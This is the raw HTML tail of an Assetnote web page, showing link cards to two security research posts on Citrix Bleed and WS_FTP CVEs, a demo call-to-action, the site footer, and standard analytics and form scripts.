</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div><div role="listitem" class="w-dyn-item"><a href="/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div><div role="listitem" class="w-dyn-item"><a href="/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules (CVE-2023-40044)</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div></div></div></div><div class="padding-top padding-medium"><div class="button-group is-right"><a href="/resources/research" class="button is-link is-alternate is-icon w-inline-block"><div>Back to All</div><div class="icon-embed-xxsmall w-embed"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--ic" width="100%" height="100%" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><path fill="currentColor" d="M6.41 6L5 7.41L9.58 12L5 16.59L6.41 18l6-6z"></path><path fill="currentColor" d="m13 6l-1.41 1.41L16.17 12l-4.58 4.59L13 18l6-6z"></path></svg></div></a></div></div></div></div></div></section><section class="section_cta1"><div class="padding-global"><div class="container-large position-relative"><div class="padding-section-medium"><div class="padding-section-large"><div class="layout1_grid"><div class="w-layout-grid cta1_component"><div class="layout1_content"><div class="margin-bottom margin-small"><div class="gradient-text-2"><h3 class="heading-style-h2 text-weight-light">Ready to get started?</h3></div><div class="padding-top padding-medium"><p class="text-size-large">Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.</p></div></div></div><div class="button-group is-center"><a href="#" class="button is-small w-button">Request a Demo</a></div></div></div></div></div><div class="cta1_graphic-1 w-embed" style="will-change: transform; transform: translate3d(20%, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d;"><svg width="100%" height="auto" viewBox="0 0 263 285" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M11 118.458C16.4704 118.458 20.905 122.893 20.905 128.363C20.905 133.833 16.4704 138.268 11 138.268C5.52962 138.268 1.095 133.833 1.095 128.363C1.095 122.893 5.52962 118.458 11 118.458Z" stroke="url(#paint0_linear_79_46539)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M20 127.861L142.943 127.865L203.381 61.1766" stroke="url(#paint1_linear_79_46539)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M84 213.458C89.4704 213.458 93.905 217.893 93.905 223.363C93.905 228.833 89.4704 233.268 84 233.268C78.5296 233.268 74.095 228.833 74.095 223.363C74.095 217.893 78.5296 213.458 84 213.458Z" stroke="url(#paint2_linear_79_46539)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M93 222.861L215.943 222.865L276.381 156.177" stroke="url(#paint3_linear_79_46539)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<defs>
<linearGradient id="paint0_linear_79_46539" x1="0" y1="139.363" x2="24.354" y2="120.384" gradientUnits="userSpaceOnUse">
<stop offset="0.147563" stop-color="#E26D2B"></stop>
<stop offset="0.543403" stop-color="#824DB8"></stop>
<stop offset="0.902785" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint1_linear_79_46539" x1="203.381" y1="61.1731" x2="37.2251" y2="34.702" gradientUnits="userSpaceOnUse">
<stop stop-color="#E26D2B" stop-opacity="0"></stop>
<stop offset="0.333333" stop-color="#E26D2B"></stop>
<stop offset="0.666667" stop-color="#824DB8"></stop>
<stop offset="1" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint2_linear_79_46539" x1="73" y1="234.363" x2="97.354" y2="215.384" gradientUnits="userSpaceOnUse">
<stop offset="0.147563" stop-color="#E26D2B"></stop>
<stop offset="0.543403" stop-color="#824DB8"></stop>
<stop offset="0.902785" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint3_linear_79_46539" x1="276.381" y1="156.173" x2="110.225" y2="129.702" gradientUnits="userSpaceOnUse">
<stop stop-color="#E26D2B" stop-opacity="0"></stop>
<stop offset="0.333333" stop-color="#E26D2B"></stop>
<stop offset="0.666667" stop-color="#824DB8"></stop>
<stop offset="1" stop-color="#3766DE"></stop>
</linearGradient>
</defs>
</svg></div><div class="cta1_graphic-1 lower w-embed" style="will-change: transform; transform: translate3d(20%, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d;"><svg width="100%" height="auto" viewBox="0 0 263 285" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M11 165.58C16.4704 165.58 20.905 161.145 20.905 155.675C20.905 150.204 16.4704 145.77 11 145.77C5.52962 145.77 1.095 150.204 1.095 155.675C1.095 161.145 5.52962 165.58 11 165.58Z" stroke="url(#paint0_linear_79_46540)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M20 156.176L142.943 156.173L203.381 222.861" stroke="url(#paint1_linear_79_46540)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M84 70.5796C89.4704 70.5796 93.905 66.1449 93.905 60.6746C93.905 55.2042 89.4704 50.7696 84 50.7696C78.5296 50.7696 74.095 55.2042 74.095 60.6746C74.095 66.1449 78.5296 70.5796 84 70.5796Z" stroke="url(#paint2_linear_79_46540)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<path d="M93 61.1764L215.943 61.1731L276.381 127.861" stroke="url(#paint3_linear_79_46540)" stroke-width="2px" vector-effect="non-scaling-stroke"></path>
<defs>
<linearGradient id="paint0_linear_79_46540" x1="0" y1="144.675" x2="24.354" y2="163.654" gradientUnits="userSpaceOnUse">
<stop offset="0.147563" stop-color="#E26D2B"></stop>
<stop offset="0.543403" stop-color="#824DB8"></stop>
<stop offset="0.902785" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint1_linear_79_46540" x1="203.381" y1="222.864" x2="37.2251" y2="249.336" gradientUnits="userSpaceOnUse">
<stop stop-color="#E26D2B" stop-opacity="0"></stop>
<stop offset="0.333333" stop-color="#E26D2B"></stop>
<stop offset="0.666667" stop-color="#824DB8"></stop>
<stop offset="1" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint2_linear_79_46540" x1="73" y1="49.6746" x2="97.354" y2="68.6539" gradientUnits="userSpaceOnUse">
<stop offset="0.147563" stop-color="#E26D2B"></stop>
<stop offset="0.543403" stop-color="#824DB8"></stop>
<stop offset="0.902785" stop-color="#3766DE"></stop>
</linearGradient>
<linearGradient id="paint3_linear_79_46540" x1="276.381" y1="127.864" x2="110.225" y2="154.336" gradientUnits="userSpaceOnUse">
<stop stop-color="#E26D2B" stop-opacity="0"></stop>
<stop offset="0.333333" stop-color="#E26D2B"></stop>
<stop offset="0.666667" stop-color="#824DB8"></stop>
<stop offset="1" stop-color="#3766DE"></stop>
</linearGradient>
</defs>
</svg></div></div></div></section><div class="footer3_component"><div class="padding-global"><div class="container-large"><div class="padding-vertical padding-xxlarge"><div class="padding-bottom padding-xxlarge"><div class="w-layout-grid footer3_top-wrapper"><div class="footer3_left-wrapper"><div class="margin-bottom margin-medium"><a href="#" class="footer3_logo-link w-nav-brand"><img src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg" loading="lazy" alt=""></a></div><div class="margin-bottom margin-large"><div class="footer3_details-wrapper"><div class="margin-bottom margin-small"><div href="mailto:" class="text-size-small"><span class="text-weight-semibold">Address: <br></span>Level 10, 12 Creek Street, Brisbane QLD, 4000<br>‍<br><span class="text-weight-semibold">Contact:</span><a href="#"><br></a><a href="mailto:contact@assetnote.io">contact@assetnote.io<br><br></a><span class="text-weight-semibold">Press Inquiries:</span><a href="mailto:contact@assetnote.io"><br></a><a href="mailto:press@assetnote.io">press@assetnote.io</a></div></div><img src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png" loading="lazy" id="w-node-_1dc470ca-d41d-1998-a5c5-7e51e1eddaa5-4097134f" alt="" class="image"></div></div><div class="w-layout-grid footer3_social-list"><a href="https://twitter.com/assetnote" target="_blank" class="footer3_social-link w-inline-block"><div class="social-icon w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M20.9728 6.7174C20.5084 7.33692 19.947 7.87733 19.3103 8.31776C19.3103 8.47959 19.3103 8.64142 19.3103 8.81225C19.3154 11.7511 18.1415 14.5691 16.0518 16.6345C13.962 18.6999 11.1312 19.8399 8.19405 19.7989C6.49599 19.8046 4.81967 19.4169 3.29642 18.6661C3.21428 18.6302 3.16131 18.549 3.16162 18.4593V18.3604C3.16162 18.2313 3.26623 18.1267 3.39527 18.1267C5.06442 18.0716 6.67402 17.4929 7.99634 16.4724C6.48553 16.4419 5.12619 15.5469 4.5006 14.1707C4.46901 14.0956 4.47884 14.0093 4.52657 13.9432C4.57429 13.8771 4.653 13.8407 4.73425 13.8471C5.19342 13.8932 5.65718 13.8505 6.1002 13.7212C4.43239 13.375 3.17921 11.9904 2.99986 10.2957C2.99349 10.2144 3.02992 10.1357 3.096 10.0879C3.16207 10.0402 3.24824 10.0303 3.32338 10.062C3.77094 10.2595 4.25409 10.3635 4.74324 10.3676C3.28184 9.40846 2.65061 7.58405 3.20655 5.92622C3.26394 5.76513 3.40181 5.64612 3.5695 5.61294C3.73718 5.57975 3.90996 5.63728 4.02432 5.76439C5.99639 7.86325 8.70604 9.11396 11.5819 9.25279C11.5083 8.95885 11.4721 8.65676 11.4741 8.35372C11.501 6.76472 12.4842 5.34921 13.9634 4.76987C15.4425 4.19054 17.1249 4.56203 18.223 5.71044C18.9714 5.56785 19.695 5.31645 20.3707 4.96421C20.4202 4.93331 20.483 4.93331 20.5325 4.96421C20.5634 5.01373 20.5634 5.07652 20.5325 5.12604C20.2052 5.87552 19.6523 6.50412 18.9509 6.92419C19.5651 6.85296 20.1685 6.70807 20.7482 6.49264C20.797 6.45942 20.8611 6.45942 20.9099 6.49264C20.9508 6.51134 20.9814 6.54711 20.9935 6.59042C21.0056 6.63373 20.998 6.68018 20.9728 6.7174Z" fill="CurrentColor"></path>
</svg></div></a><a href="https://www.linkedin.com/company/assetnote/" target="_blank" class="footer3_social-link w-inline-block"><div class="social-icon w-embed"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M5 3H19C20.1046 3 21 3.89543 21 5V19C21 20.1046 20.1046 21 19 21H5C3.89543 21 3 20.1046 3 19V5C3 3.89543 3.89543 3 5 3ZM8 18C8.27614 18 8.5 17.7761 8.5 17.5V10.5C8.5 10.2239 8.27614 10 8 10H6.5C6.22386 10 6 10.2239 6 10.5V17.5C6 17.7761 6.22386 18 6.5 18H8ZM7.25 9C6.42157 9 5.75 8.32843 5.75 7.5C5.75 6.67157 6.42157 6 7.25 6C8.07843 6 8.75 6.67157 8.75 7.5C8.75 8.32843 8.07843 9 7.25 9ZM17.5 18C17.7761 18 18 17.7761 18 17.5V12.9C18.0325 11.3108 16.8576 9.95452 15.28 9.76C14.177 9.65925 13.1083 10.1744 12.5 11.1V10.5C12.5 10.2239 12.2761 10 12 10H10.5C10.2239 10 10 10.2239 10 10.5V17.5C10 17.7761 10.2239 18 10.5 18H12C12.2761 18 12.5 17.7761 12.5 17.5V13.75C12.5 12.9216 13.1716 12.25 14 12.25C14.8284 12.25 15.5 12.9216 15.5 13.75V17.5C15.5 17.7761 15.7239 18 16 18H17.5Z" fill="CurrentColor"></path>
</svg></div></a></div></div><div class="w-layout-grid footer3_menu-wrapper"><div class="footer3_link-list"><div class="padding-bottom padding-xxsmall"><div class="text-size-small">Platform Features</div></div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/platform/asset-discovery" class="footer3_link">Continuous Asset Discovery</a></div><div role="listitem" class="w-dyn-item"><a href="/platform/asset-enrichment" class="footer3_link">Deep Asset Enrichment</a></div><div role="listitem" class="w-dyn-item"><a href="/platform/assetnote-exposure-engine" class="footer3_link">Assetnote Exposure Engine</a></div><div role="listitem" class="w-dyn-item"><a href="/platform/expert-security-research" class="footer3_link">Expert Security Research</a></div><div role="listitem" class="w-dyn-item"><a href="/platform/collaborative-workflows" class="footer3_link">Collaborative Workflows</a></div><div role="listitem" class="w-dyn-item"><a href="/platform/customization" class="footer3_link">Customization</a></div></div></div></div><div class="footer3_link-list"><div class="padding-bottom padding-xxsmall"><div class="text-size-small">Use Cases</div></div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/use-cases/continuous-asset-discovery-and-inventory" class="footer3_link">Continuous Asset Discovery and Inventory</a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/continuous-security-monitoring" class="footer3_link">Real-Time Exposure Monitoring</a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/attack-surface-reduction" class="footer3_link">Attack Surface Reduction</a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/mergers-and-acquisitions" class="footer3_link">Mergers &amp; Acquisitions</a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/bug-bounty-readiness" class="footer3_link">Bug Bounty Readiness</a></div></div></div></div></div></div></div><div class="line-divider background-color-white"></div><div class="padding-top padding-medium"><div class="footer3_bottom-wrapper"><div class="footer3_credit-text">© 2024 Assetnote. All rights reserved.</div><div class="w-layout-grid footer3_legal-list"><a href="https://assetnote.io/policies/privacy-policy" class="footer3_legal-link">Privacy Policy</a></div></div></div></div></div></div></div></main></div><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6422e507d5004f85d107063a" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/js/webflow.ea156c415.js" type="text/javascript"></script><script>!function () {var reb2b = window.reb2b = window.reb2b || [];if (reb2b.invoked) return;reb2b.invoked = true;reb2b.methods = ["identify", "collect"];reb2b.factory = function (method) {return function () {var args = Array.prototype.slice.call(arguments);args.unshift(method);reb2b.push(args);return reb2b;};};for (var i = 0; i < reb2b.methods.length; i++) {var key = reb2b.methods[i];reb2b[key] = reb2b.factory(key);}reb2b.load = function (key) {var script = document.createElement("script");script.type = "text/javascript";script.async = true;script.src = "https://s3-us-west-2.amazonaws.com/b2bjsstore/b/" + key + "/reb2b.js.gz";var first = document.getElementsByTagName("script")[0];first.parentNode.insertBefore(script, first);};reb2b.SNIPPET_VERSION = "1.0.1";reb2b.load("L9NMMZH3WMNW");}();</script>

<script>
!function(t){if(window.ko)return;window.ko=[],["identify","track","removeListeners","open","on","off","qualify","ready"].forEach(function(t){ko[t]=function(){var n=[].slice.call(arguments);return n.unshift(t),ko.push(n),ko}});var n=document.createElement("script");n.async=!0,n.setAttribute("src","https://cdn.getkoala.com/v1/pk_a39c13e7cbab005ae0f3a62c1264b27faae7/sdk.js"),(document.body || document.head).appendChild(n)}();
</script><script async="" src="https://cdn.getkoala.com/v1/pk_a39c13e7cbab005ae0f3a62c1264b27faae7/sdk.js"></script>

<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.21/css/jquery.dataTables.css">
<script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.js"></script>
<script>
$(document).ready( function () {
    $('#bugs-bb-four-years').DataTable();
} );
</script><!-- START - We recommend to place the below code in footer or bottom of your website html  -->
<script>
  window.REQUIRED_CODE_ERROR_MESSAGE = 'Please choose a country code';
  window.LOCALE = 'en';
  window.EMAIL_INVALID_MESSAGE = window.SMS_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";

  window.REQUIRED_ERROR_MESSAGE = "This field cannot be left blank. ";

  window.GENERIC_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";




  window.translation = {
    common: {
      selectedList: '{quantity} list selected',
      selectedLists: '{quantity} lists selected'
    }
  };

  var AUTOHIDE = Boolean(0);
</script>
<script defer="" src="https://sibforms.com/forms/end-form/build/main.js"></script>

<script src="https://www.google.com/recaptcha/api.js?hl=en"></script>

<!-- END - We recommend to place the above code in footer or bottom of your website html  -->

<script defer="">
var querystring = 'ref=assetnote.io';
document.addEventListener('click', function (e) {
    var x = e.originalTarget;
    if (x.nodeName === 'A') {
        var href = x.getAttribute('href');
        if(href) {
            href += (/\?/.test(href) ? '&' : '?') + querystring;
            x.setAttribute('href', href);
        }
    }
}, false);</script></body></html>